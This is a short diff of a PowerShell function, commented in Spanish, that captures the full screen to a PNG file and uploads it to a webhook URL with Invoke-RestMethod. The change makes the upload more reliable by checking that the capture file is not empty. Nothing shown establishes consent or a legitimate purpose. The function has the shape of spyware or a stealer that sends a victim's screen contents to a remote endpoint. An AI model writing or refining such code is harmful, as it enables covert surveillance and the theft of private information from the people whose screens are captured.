@@ -19,8 +19,8 @@ function CaptureAndSendScreenshot {
     $graphic.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)
     $bitmap.Save($screenshotFile, [System.Drawing.Imaging.ImageFormat]::Png)
 
-    # Verificar si el archivo de captura de pantalla existe antes de intentar enviarlo al webhook
-    if (Test-Path $screenshotFile) {
+    # Verificar si el archivo de captura de pantalla se creó exitosamente y tiene contenido
+    if ((Test-Path $screenshotFile) -and (Get-Item $screenshotFile).length -gt 0) {
         try {
             # Envío de la captura de pantalla al webhook
             Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data" -InFile $screenshotFile -ErrorAction Stop
@@ -28,7 +28,7 @@ function CaptureAndSendScreenshot {
             Write-Host "Ocurrió un error al intentar enviar la captura de pantalla al webhook: $_"
         }
     } else {
-        Write-Host "El archivo de captura de pantalla no se encontró. No se pudo enviar al webhook."
+        Write-Host "La captura de pantalla no se realizó correctamente o el archivo está vacío. No se pudo enviar al webhook."
     }
 }
 
